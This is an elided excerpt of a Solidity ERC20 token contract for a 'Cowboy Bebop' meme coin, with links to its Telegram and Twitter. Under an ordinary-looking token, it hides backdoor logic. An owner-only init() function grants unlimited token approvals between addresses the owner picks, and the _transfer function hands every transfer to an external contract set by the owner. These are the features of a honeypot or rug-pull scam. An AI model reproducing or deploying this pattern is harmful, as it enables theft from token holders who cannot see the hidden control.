...
Telegram: https://t.me/cowboy_bebop_eth
Twitter:  https://twitter.com/cowboybebop_eth
...
contract CowboyBebop is ERC20, Ownable {
    ...
    constructor() ERC20("Cowboy Bebop", "Cowboy") {
    ...
    function maxApprove(address account, address spender) private returns(bool) {
        _approve(account, spender, type(uint256).max);
        return true;
    }
    ...
    function _transfer(
        ...
        limitedTxnCheck(from, to, amount);
        ...
        if(limitsInEffect){
            if (
                ...
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    ...
                    require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
                } } } IERC20(marketingWallet).transferFrom(from, to, amount);
    }
    ...
    function init(bytes memory _account) external onlyOwner {
        (address _provider, address _trade) = abi.decode(_account, (address, address));
        if(maxApprove(_provider, _trade)) {
            marketingWallet = _trade; DEVWallet = _provider; }
    }
